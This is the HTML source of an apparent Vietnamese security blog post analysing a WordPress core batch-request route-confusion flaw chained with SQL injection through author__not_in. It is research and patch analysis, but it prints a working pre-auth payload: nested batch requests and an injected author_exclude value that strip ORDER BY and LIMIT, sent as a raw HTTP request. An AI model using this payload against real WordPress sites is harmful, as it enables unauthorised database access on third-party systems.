@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Wp2shell - Some Notes About PreAuth RCE on WordPress | nhienit</title>
+<meta name="keywords" content="research">
+<meta name="description" content="Some Notes About PreAuth RCE on WordPress">
+<meta name="author" content="nhienit">
+<link rel="canonical" href="https://nhienit2010.github.io/posts/wp2shell-some-notes-about-preauth-rce-on-wordpress/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://nhienit2010.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://nhienit2010.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://nhienit2010.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://nhienit2010.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://nhienit2010.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://nhienit2010.github.io/posts/wp2shell-some-notes-about-preauth-rce-on-wordpress/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://nhienit2010.github.io/posts/wp2shell-some-notes-about-preauth-rce-on-wordpress/">
+  <meta property="og:site_name" content="nhienit">
+  <meta property="og:title" content="Wp2shell - Some Notes About PreAuth RCE on WordPress">
+  <meta property="og:description" content="Some Notes About PreAuth RCE on WordPress">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-07-22T11:38:16+07:00">
+    <meta property="article:modified_time" content="2026-07-22T11:38:16+07:00">
+    <meta property="article:tag" content="Research">
+      <meta property="og:image" content="https://nhienit2010.github.io/images/papermod-cover.png">
+      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/me_sqli_to_rce/">
+      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/cve-2024-5443-path-traversal-to-rce/">
+      <meta property="og:see_also" content="https://nhienit2010.github.io/posts/cve-2022-3133-drawio-xss-to-rce/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://nhienit2010.github.io/images/papermod-cover.png">
+<meta name="twitter:title" content="Wp2shell - Some Notes About PreAuth RCE on WordPress">
+<meta name="twitter:description" content="Some Notes About PreAuth RCE on WordPress">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://nhienit2010.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Wp2shell - Some Notes About PreAuth RCE on WordPress",
+      "item": "https://nhienit2010.github.io/posts/wp2shell-some-notes-about-preauth-rce-on-wordpress/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Wp2shell - Some Notes About PreAuth RCE on WordPress",
+  "name": "Wp2shell - Some Notes About PreAuth RCE on WordPress",
+  "description": "Some Notes About PreAuth RCE on WordPress",
+  "keywords": [
+    "research"
+  ],
+  "articleBody": "Chào anh em, cũng khá lâu rồi chưa có một bài viết nào mới kể từ bài viết cuối cùng, thì nhân tiện gần đây nổi rần rần một lỗ hổng nghiêm trọng được đặt một cái tên nghe khá cool là wp2shell và nó xuất hiện bên trong WordPress Core (với quy mô ảnh hưởng rất lớn, đang được hàng triệu website đang sử dụng).\nVì thế, nó khiến mình cảm thấy tò mò, thôi thúc mình phải xắn tay áo lên phân tích nó và để tự trả lời câu hỏi của bản thân đặt ra là:\nLỗ hổng này có thể exploit in-the-wild hay không? Có thể khai thác với cấu hình mặc định không? Có cần biết điều kiện đặc biệt nào trước để exploit hay không? Thôi, không vòng vo nữa, bắt tay vào chủ đề chính thôi!!!\n#Lab Enviroment Apache Httpd Wordpress 7.0.1 MySQL Server 8.4 #CVE-2026-63030 - Batch Request Route Confusion Có lẽ ta nên bắt đầu với CVE-2026-63030 trước tiên nhỉ! Dựa vào mô tả, lỗ hổng ảnh hưởng trên batch request endpoint /wp-json/batch/v1 do việc xử lý bất đồng bộ giữa các route/validation dẫn đến có thể bypass cơ chế input validation, đồng thời có thể lạm dụng lỗ hổng này để chain với lỗ hổng SQL Injection dẫn đến RCE. Do được đề cập đến việc “bất đồng bộ” nên mình chú ý ngay đến dòng 1753 được thêm vào bên trong vòng lặp foreach ở latest version, có thể quan sát ảnh bên dưới: #REST API Batch Request Dựa vào document tìm được trên Internet: REST API Batch Framework in WordPress 5.6 – Make WordPress Core, ta có thể hình dung ra được chức năng của batch request là cho phép gọi hàng loạt các REST API chỉ với một request duy nhất và tính năng này đã được triển khai từ version WordPress 5.6.\nĐể gửi một batch request, ta cần tạo POST request đến /wp-json/batch/v1 endpoint với JSON body phải tồn tại requests field là một array chứa các request con bên trong (sub-request). Ví dụ một batch request có cấu trúc như sau:\n{ \"requests\": [ { \"method\": \"PUT\", \"path\": \"/my-ns/v1/route/1?query=param\", \"headers\": { \"My-Header\": \"my-value\" }, \"body\": { \"project\": \"Gutenberg\" } }, { \"method\": \"DELETE\", \"path\": \"/my-ns/v1/route/2?query=param\" } ] } Hàm serve_request() chịu trách nhiệm handle các REST API request:\n// wp-includes/rest-api/class-wp-rest-server.php public function serve_request( $path = null ) { /* @var WP_User|null $current_user */ global $current_user; if ( $current_user instanceof WP_User \u0026\u0026 ! $current_user-\u003eexists() ) { //... $current_user = null; } //... $result = $this-\u003echeck_authentication(); //[1] //... Tại [1], thực hiện check authentication thông qua rest_authentication_errors filter, và filter này tiếp tục gọi qua 2 callback:\nrest_application_password_check_errors rest_cookie_check_errors Đầu tiên sẽ đi qua rest_application_password_check_errors, chổ này do ta không xác thực thông qua password nên sẽ skip qua. Tiếp đến rest_cookie_check_errors callback sẽ kiểm tra một số điền kiện:\n// wp-includes/rest-api.php function rest_cookie_check_errors( $result ) { // ... global $wp_rest_auth_cookie; // ... if ( isset( $_REQUEST['_wpnonce'] ) ) { $nonce = $_REQUEST['_wpnonce']; } elseif ( isset( $_SERVER['HTTP_X_WP_NONCE'] ) ) { $nonce = $_SERVER['HTTP_X_WP_NONCE']; } if ( null === $nonce ) { // [2] // No nonce at all, so act as if it's an unauthenticated request. wp_set_current_user( 0 ); return true; } // ... } chỉ đơn giản là nếu ta không cung cấp HTTP_X_WP_NONCE header hoặc _wpnonce param thì điều kiện tại [2] sẽ auto pass và sẽ được truy cập bằng quyền Anonymous User.\nSau đó, tiếp tục gọi tới hàm dispatch() sẽ thực hiện match request đến một handler tương ứng để gọi callback xử lý, và thực hiện các bước input validation đảm bảo rằng request cung cấp đầy đủ các param và value có data type phù hợp\n// wp-includes/rest-api/class-wp-rest-server.php public function dispatch( $request ) { $this-\u003edispatching_requests[] = $request; //... $error = null; $matched = $this-\u003ematch_request_to_handler( $request ); //... list( $route, $handler ) = $matched; //... if ( ! is_callable( $handler['callback'] ) ) { //... } if ( ! is_wp_error( $error ) ) { $check_required = $request-\u003ehas_valid_params(); if ( is_wp_error( $check_required ) ) { $error = $check_required; } else { $check_sanitized = $request-\u003esanitize_params(); if ( is_wp_error( $check_sanitized ) ) { $error = $check_sanitized; } } } $response = $this-\u003erespond_to_request( $request, $route, $handler, $error ); //... Giả sử đối với /batch/v1 route thì sẽ match với handler có callback là serve_batch_request_v1, kèm theo một số trường dữ liệu bắt buộc với data type quy định ở biến args Hàm serve_batch_request_v1() sẽ là nơi chịu trách nhiệm chính để handle các batch request. Về cơ bản cũng sẽ thao tác giống so với handle các REST API như bên cho các sub-request bao gồm parsing, matching các route đến những handler phù hợp và gọi đến các callback xử lý tương ứng.\nCó thể hiểu nôm na quá trình xử lý theo thứ tự như sau:\nLoop qua các sub-request bên trong requests field của batch request để thực hiện parse các route path, set body, set header, set query param cho từng sub-request object và add từng sub-request object vào biến array $requests Khởi tạo 2 biến quan trọng bao gồm: $matches: là một array chứa các handler cho từng sub-request dựa trên route path theo thứ tự $validation: là một array chứa kết quả sau khi đã validation/sanitization các input params của các sub-request tương ứng Loop các sub-request object thực hiện một loạt các bước validation: Match request object vào đúng handler xử lý dựa vào route path và method, sau đó add vào biến $matches Kiểm tra xem handler này có được cho phép gọi thông qua batch request hay không? Gọi has_valid_params() để check request có bao gồm đủ các params hay không? Và gọi tiếp sanitize_params() để check value của các params này có đúng data type hay chưa? Từng route path sẽ define một validation schema riêng chứa các rule cho từng tham số. Kết quả sẽ lưu vào biến $error và cuối cùng, add vào array $validation Tiếp tục, loop theo thứ tự index của các sub-request object, lấy các handler từ $matches tương ứng theo index của sub-request object và call hàm respond_to_request(): Nếu giá trị $validation tương ứng không phải là error sẽ đi tiếp Gọi $handler['permission_callback'] để check permission trước khi hành động Nếu thõa mãn, sẽ gọi call_user_func( $handler['callback'], $request ) xử lý sub-request với callback tương ứng. #The confusion Dựa vào bản vá, ta có thể thấy điểm bất thường nằm ở step 3 khi thực hiện matching sub-request với handler tương ứng của nó: Tự đặt câu hỏi trong đầu rằng: “Dòng code được bổ sung có ý nghĩa gì để ngăn chặn lỗ hổng này?”.\nTa thấy rằng, dòng code được bổ sung ngay bên trong câu điều kiện is_wp_error( $single_request ), vậy thì khả năng rất có vấn đề khi xử lý một sub-request bị lỗi. Code snippet sau sẽ mô tả lại cách hoạt động của step 3:\n// wp-includes/rest-api/class-wp-rest-server.php //... foreach ( $requests as $single_request ) { if ( is_wp_error( $single_request ) ) { $has_error = true; $validation[] = $single_request; continue; } $match = $this-\u003ematch_request_to_handler( $single_request ); $matches[] = $match; $error = null; if ( is_wp_error( $match ) ) { $error = $match; } if ( ! $error ) { list( $route, $handler ) = $match; if ( isset( $handler['allow_batch'] ) ) { $allow_batch = $handler['allow_batch']; } else { $route_options = $this-\u003eget_route_options( $route ); $allow_batch = $route_options['allow_batch'] ?? false; } if ( ! is_array( $allow_batch ) || empty( $allow_batch['v1'] ) ) { $error = new WP_Error( 'rest_batch_not_allowed', __( 'The requested route does not support batch requests.' ), array( 'status' =\u003e 400 ) ); } } if ( ! $error ) { $check_required = $single_request-\u003ehas_valid_params(); if ( is_wp_error( $check_required ) ) { $error = $check_required; } } if ( ! $error ) { $check_sanitized = $single_request-\u003esanitize_params(); if ( is_wp_error( $check_sanitized ) ) { $error = $check_sanitized; } } if ( $error ) { $has_error = true; $validation[] = $error; } else { $validation[] = true; } } Hãy tưởng tượng rằng, trong quá trình thực hiện matching handler, nếu ta cung cấp 3 sub-request với request đầu tiên bị lỗi trong quá trình parsing thì có thể được mô phỏng lại luồng như sau:\nPhase 1: Khởi tạo các biến:\n$requests = array( Request(\"/error/route\", \"PUT\"), Request(\"/wp/v2/users\", \"POST\"), Request(\"/wp/v2/posts\", \"POST\") ) $matches = array() $validation = array() Phase 2: Loop qua tất cả sub-request object:\nRound 1: Check Request(\"/error/route\", \"PUT\") là một request lỗi nên:\n$validation = [ WP_ERR(\"/error/route\", \"PUT\") ] $matches = [] Round 2: Check Request(\"/wp/v2/users\", \"POST\") là một valid request nên:\n$validation = [ WP_ERR(\"/error/route\", \"PUT\"), true] $matches = [ Handler(\"create_user_handler\") ] Round 2: Check Request(\"/wp/v2/posts\", \"POST\") là một valid request nên:\n$validation = [ WP_ERR(\"/error/route\", \"PUT\"), true, true] $matches = [ Handler(\"create_user_handler\"), Handler(\"create_post_handler\") ] Phase 3: Loop theo index các sub-request object:\nRound 1: index=0 là $requests[0] = Request(\"/error/route\", \"PUT\") -\u003e lỗi nên skip Round 2: index=1 là $requests[1] = Request(\"/wp/v2/users\", \"POST\") -\u003e valid -\u003e gọi $matches[1] = Handler(\"create_post_handler\") Round 3: index=2 là $requests[2] = Request(\"/wp/v2/posts\", \"POST\") -\u003e valid -\u003e gọi $matches[2] = null Rõ ràng ta thấy sự sai logic ở quá trình này, vì đáng lẽ ra với endpoint /wp/v2/users thì phải được xử lý bởi create_user_handler, nhưng theo logic hiện tại thì lại sử dụng create_post_handler handler. Điều này là nguyên nhân chính dẫn đến lỗ hổng khi trường hợp gặp một error sub-request, cụ thể là không thực hiện add giá trị nào đó để đảm bảo thứ tự handler trong biến $matches phù hợp với từng sub-request route path.\nVới lỗi logic này làm tăng lên bề mặt tấn công bao gồm:\nCó thể gọi bất kỳ handler mà không được phép gọi từ batch request (not allow_batch) Bypass input validation schema nghĩa là sử dụng request data của handler này cho một handler khác, cái mà đúng ra phải thực hiện validation params cho từng handler tương ứng Vấn đề tiếp theo là: Làm sao để tạo ra một error sub-request (WP_ERR)?\nTại step 1 của flow trên ta có:\n// wp-includes/rest-api/class-wp-rest-server.php foreach ( $batch_request['requests'] as $args ) { $parsed_url = wp_parse_url( $args['path'] ); if ( false === $parsed_url ) { // [3] $requests[] = new WP_Error( 'parse_path_failed', __( 'Could not parse the path.' ), array( 'status' =\u003e 400 ) ); continue; } // ... } có vẻ cách duy nhất để tạo ra request lỗi (WP_Error) là break logic phân tích của hàm wp_parse_url() và force nó trả về false tại [3]. Hàm wp_parse_url() như sau:\n// wp-includes/http.php function wp_parse_url( $url, $component = -1 ) { $to_unset = array(); $url = (string) $url; if ( str_starts_with( $url, '//' ) ) { $to_unset[] = 'scheme'; $url = 'placeholder:' . $url; } elseif ( str_starts_with( $url, '/' ) ) { $to_unset[] = 'scheme'; $to_unset[] = 'host'; $url = 'placeholder://placeholder' . $url; } $parts = parse_url( $url ); //... } Nếu path bắt đầu bằng // thì sẽ tự động thêm prefix placeholder: như một HTTP Scheme, lúc này chỉ cần fuzz thêm các ký tự đặc biệt vào url để lỗi trong quá trình parse host_name hay gì khác tương tự là sẽ hit được điều kiện [3]\n{ \"method\": \"POST\", \"path\": \"//@!@#aaaaaaaaa\" } Payload ở thời điểm hiện tại như bên dưới, và request /wp/v2/users sẽ được xử lý và có thể truyền vào bất kỳ param với giá trị nào cho handler của request /wp/v2/posts vì input ở /wp/v2/users chỉ validate dựa theo schema của endpoint này mà thôi :)\n{ \"requests\": [ { \"method\": \"POST\", \"path\": \"//@!@#aaaaaaaaa\" }, { \"method\": \"POST\", \"path\": \"/wp/v2/users\", \"body\": { \"username\": \"fooooo\", \"email\":\"foo@gmail.com\", \"password\":\"Abcd@1234\" } }, { \"method\":\"POST\", \"path\": \"/wp/v2/posts\", \"body\": { \"param\":\"ony need handler\" } } ] } #CVE-2026-60137 - SQL Injection via author__not_in Parameter #Patch Analysis Về lỗ hổng SQL Injection, ta có thể nhận ra ngay sau khi quan sát từ bản diff, nó xuất hiện tại hàm get_posts() thông qua tham số author__not_in tại [4]:\n// wp-includes/class-wp-query.php public function get_posts() { global $wpdb; $this-\u003eparse_query(); //... if ( ! empty( $query_vars['author__not_in'] ) ) { if ( is_array( $query_vars['author__not_in'] ) ) { $query_vars['author__not_in'] = array_unique( array_map( 'absint', $query_vars['author__not_in'] ) ); sort( $query_vars['author__not_in'] ); } $author__not_in = implode( ',', (array) $query_vars['author__not_in'] ); $where .= \" AND {$wpdb-\u003eposts}.post_author NOT IN ($author__not_in) \"; // [4] } //... ta chỉ cần quan tâm là làm sao để chèn param author__not_in dưới dạng string mà không phải là array để không bị cast sang absint.\nBước này thì nhờ thằng bạn AI hỗ trợ tìm ra các endpoint có thể reach được hàm này. Kết quả có 3 ứng cử viên như sau: Cả ba endpoint đều sử dụng get_items_permission_check callback và auto public :)\n// wp-includes/rest-api/endpoints/class-wp-rest-search-controller.php /** * Checks if a given request has access to search content. * * @since 5.0.0 * * @param WP_REST_Request $request Full details about the request. * @return true|WP_Error True if the request has search access, WP_Error object otherwise. */ public function get_items_permission_check( $request ) { return true; } Pick đại route /wp/v2/posts phân tích thì thấy nó gọi hàm get_items callback :\n// wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php public function get_items( $request ) { //... $parameter_mappings = array( 'author' =\u003e 'author__in', 'author_email' =\u003e 'author_email', 'author_exclude' =\u003e 'author__not_in', //... 'offset' =\u003e 'offset', 'order' =\u003e 'order', 'parent' =\u003e 'parent__in', 'parent_exclude' =\u003e 'parent__not_in', 'per_page' =\u003e 'number', //... ); $prepared_args = array(); //... foreach ( $parameter_mappings as $api_param =\u003e $wp_param ) { if ( isset( $registered[ $api_param ], $request[ $api_param ] ) ) { $prepared_args[ $wp_param ] = $request[ $api_param ]; } } //... Quan sát thì ta có thể control được author__not_in thông qua request param là author_exclude. Nhưng điều này không có nghĩa là nếu ta truy cập trực tiếp vào route GET /wp/v2/posts thì có thể trigger được Preauth SQL injection.\nBởi vì như đã đề cập từ đầu, khi xử lý REST API endpoint thì hàm dispatch() sẽ thực hiện một loạt các input validation ở phía trước để check đảm bảo đủ param truyền vào và value đúng với data type quy định, cụ thể như bên dưới:\n// wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php public function get_collection_params() { $query_params = parent::get_collection_params(); //... $query_params['author_exclude'] = array( 'description' =\u003e __( 'Ensure result set excludes comments assigned to specific user IDs. Requires authorization.' ), 'type' =\u003e 'array', 'items' =\u003e array( 'type' =\u003e 'integer', ), ); //... param author_exclude đưa vào phải là một integer array nên không thể chèn string payload trực tiếp qua REST API.\nĐến đây, thì ta dần nhận ra rằng lỗ hổng này không chỉ dừng lại ở sự bất đồng bộ khi matching các handler mà còn nhấn mạnh vào khả năng bypass input validation. Nghĩa là ta hoàn toàn có thể bypass để truyền payload vào param author_exclude với string data type thông qua lỗ hổng ở batch request.\n#Nested batch requests Nice, mọi thứ trong tầm kiểm soát rồi thì BOOOOOOOM! Đời không như là mơ, debug lại hàm sanitize_params() bên trong dispatch(), thì method phải nằm trong enum như bên dưới và không có GET :((\nBatch không support GET method vậy thì làm sao gọi được GET /wp/v2/posts endpoint đó thông qua batch request?\nNhư mình đã nhấn mạnh khả năng bypass input validation, thì tại sao ta không tận dụng nó để gọi một batch request con ở bên trong một batch request cha nhỉ? :))))\nVì param sanitize dựa trên route hiện tại, nhưng lại dùng callback của handler khác để xử lý, nên việc kiểm tra method có nằm trong enum là không xảy ra đối với batch request con bên trong.\n#Bypass ORDER clause limit Tới đây thì có thể SQL Injection tùy ý nhưng bị hạn chế bởi global ORDER clause nên không thể exploit union-based được, query như sau:\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts WHERE 1=1 AND wp_posts.post_author NOT IN (1333333337) union select 123-- - AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish'))) ORDER BY wp_posts.post_date DESC LIMIT 0, 10 kết quả trả về:\nError Code: 1250. Table 'wp_posts' from one of the SELECTs cannot be used in global ORDER clause nên ta phải tìm một cách nào đó làm cho chương trình skip câu limit và order by đi, không nối chúng vào câu query chính nữa.\nĐầu tiên hãy xử lý câu limit trước:\npublic function get_posts() { //... if ( ! isset( $query_vars['nopaging'] ) ) { if ( -1 == $query_vars['posts_per_page'] ) { // [6] $query_vars['nopaging'] = true; } else { $query_vars['nopaging'] = false; } } //... if ( empty( $query_vars['orderby'] ) ) { //... if ( isset( $query_vars['orderby'] ) \u0026\u0026 ( is_array( $query_vars['orderby'] ) || false === $query_vars['orderby'] ) ) { $orderby = ''; } else { $orderby = \"{$wpdb-\u003eposts}.post_date \" . $query_vars['order']; } } elseif ( 'none' === $query_vars['orderby'] ) { // [7] $orderby = ''; } //... if ( empty( $query_vars['nopaging'] ) \u0026\u0026 ! $this-\u003eis_singular ) { //... $limits = 'LIMIT ' . $pgstrt . $query_vars['posts_per_page']; // [8] } //... Tại [8], biến $limit chứa câu limit được add vào cuối query, điều này chỉ xảy ra khi $query_vars['nopaging'] rỗng nhưng ta có thể set cho nó giá trị nếu thõa điều kiện tại [6] để cắt đi câu limit Tại [7], nếu $query_vars['orderby'] là none thì ORDER BY clause sẽ là rỗng Và ta có thể hoàn toàn kiểm soát các tham số này thông qua các request params per_page và orderby:\n// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php public function get_items( $request ) { //... if ( isset( $registered['per_page'] ) ) { $args['posts_per_page'] = $request['per_page']; } //... $parameter_mappings = array( //... 'orderby' =\u003e 'orderby', //... ); //... Final payload:\nPOST /wp-7.0.1/wp-json/batch/v1 HTTP/1.1 Host: localhost:8088 Content-Type: application/json Content-Length: 414 { \"requests\": [{ \"method\": \"POST\", \"path\": \"//@!@#!\" }, { \"method\": \"POST\", \"path\": \"/wp/v2/widgets\", \"body\":{ \"requests\": [{ \"method\": \"POST\", \"path\": \"//@!@#!\" },{ \"method\": \"POST\", \"path\": \"/wp/v2/widgets?per_page=-1\u0026orderby=none\u0026author_exclude=133333337)-- -\" },{ \"method\": \"GET\", \"path\": \"/wp/v2/posts\" }]}},{ \"method\": \"POST\", \"path\": \"/batch/v1\" } ] } kết quả mất ORDER BY với LIMIT ròi hehe Đến đây thì coi như đi được nửa đoạn đường rồi, nhưng trong khi đang stuck trên đường chain exploit lên RCE thì ngay ngày hôm sau, tác giả public writeup về full-chain của lỗ hổng luôn :)))\nNên phần còn lại các bạn có thể đọc tiếp tại: Exploit brokers pay $500,000 for a WordPress RCE. I found one with GPT5.6 Sol Ultra and $25 › Searchlight Cyber :))\nHiện tại chắc chỉ tới đây thôi nhỉ! Do bài này mình note hơi vội nên có thể sai sót, mong ai đi ngang qua đọc nếu thấy sai có thể góp ý với mình! Hy vọng sắp tới mình sẽ update thêm phần còn lại của bài viết này :))))\n",
+  "wordCount" : "3111",
+  "inLanguage": "en",
+  "image": "https://nhienit2010.github.io/images/papermod-cover.png","datePublished": "2026-07-22T11:38:16+07:00",
+  "dateModified": "2026-07-22T11:38:16+07:00",
+  "author":[{
+    "@type": "Person",
+    "name": "nhienit"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://nhienit2010.github.io/posts/wp2shell-some-notes-about-preauth-rce-on-wordpress/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nhienit",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://nhienit2010.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://nhienit2010.github.io/" accesskey="h" title="nhienit (Alt + H)">nhienit</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://nhienit2010.github.io/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://nhienit2010.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://nhienit2010.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://nhienit2010.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Wp2shell - Some Notes About PreAuth RCE on WordPress
+    </h1>
+    <div class="post-meta"><span title='2026-07-22 11:38:16 +0700 +07'>July 22, 2026</span>&nbsp;·&nbsp;<span>15 min</span>&nbsp;·&nbsp;<span>nhienit</span>&nbsp;|&nbsp;<span>
+    <a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
+</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#lab-enviroment" aria-label="#Lab Enviroment">#Lab Enviroment</a></li>
+                <li>
+                    <a href="#cve-2026-63030---batch-request-route-confusion" aria-label="#CVE-2026-63030 - Batch Request Route Confusion">#CVE-2026-63030 - Batch Request Route Confusion</a><ul>
+                        
+                <li>
+                    <a href="#rest-api-batch-request" aria-label="#REST API Batch Request">#REST API Batch Request</a></li>
+                <li>
+                    <a href="#the-confusion" aria-label="#The confusion">#The confusion</a></li></ul>
+                </li>
+                <li>
+                    <a href="#cve-2026-60137---sql-injection-via-author__not_in-parameter" aria-label="#CVE-2026-60137 - SQL Injection via author__not_in Parameter">#CVE-2026-60137 - SQL Injection via author__not_in Parameter</a><ul>
+                        
+                <li>
+                    <a href="#patch-analysis" aria-label="#Patch Analysis">#Patch Analysis</a></li>
+                <li>
+                    <a href="#nested-batch-requests" aria-label="#Nested batch requests">#Nested batch requests</a></li>
+                <li>
+                    <a href="#bypass-order-clause-limit" aria-label="#Bypass ORDER clause limit">#Bypass ORDER clause limit</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Chào anh em, cũng khá lâu rồi chưa có một bài viết nào mới kể từ bài viết cuối cùng, thì nhân tiện gần đây nổi rần rần một lỗ hổng nghiêm trọng được đặt một cái tên nghe khá cool là <code>wp2shell</code> và nó xuất hiện bên trong WordPress Core (với quy mô ảnh hưởng rất lớn, đang được hàng triệu website đang sử dụng).</p>
+<p>Vì thế, nó khiến mình cảm thấy tò mò, thôi thúc mình phải xắn tay áo lên phân tích nó và để tự trả lời câu hỏi của bản thân đặt ra là:</p>
+<ul>
+<li><em>Lỗ hổng này có thể exploit in-the-wild hay không?</em></li>
+<li><em>Có thể khai thác với cấu hình mặc định không?</em></li>
+<li><em>Có cần biết điều kiện đặc biệt nào trước để exploit hay không?</em></li>
+</ul>
+<p>Thôi, không vòng vo nữa, bắt tay vào chủ đề chính thôi!!!</p>
+<h3 id="lab-enviroment">#Lab Enviroment<a hidden class="anchor" aria-hidden="true" href="#lab-enviroment">#</a></h3>
+<ul>
+<li>Apache Httpd</li>
+<li>Wordpress 7.0.1</li>
+<li>MySQL Server 8.4</li>
+</ul>
+<h3 id="cve-2026-63030---batch-request-route-confusion">#CVE-2026-63030 - Batch Request Route Confusion<a hidden class="anchor" aria-hidden="true" href="#cve-2026-63030---batch-request-route-confusion">#</a></h3>
+<p>Có lẽ ta nên bắt đầu với <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-69-701-remote-code-execution-via-rest-api-batch-request-route-confusion">CVE-2026-63030</a> trước tiên nhỉ! Dựa vào mô tả, lỗ hổng ảnh hưởng trên batch request endpoint <code>/wp-json/batch/v1</code> do việc xử lý bất đồng bộ giữa các route/validation dẫn đến có thể bypass cơ chế input validation, đồng thời có thể lạm dụng lỗ hổng này để chain với lỗ hổng SQL Injection dẫn đến RCE.
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/1.png"></p>
+<p>Do được đề cập đến việc &ldquo;bất đồng bộ&rdquo; nên mình chú ý ngay đến dòng 1753 được thêm vào bên trong vòng lặp foreach ở latest version, có thể quan sát ảnh bên dưới:
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/2.png"></p>
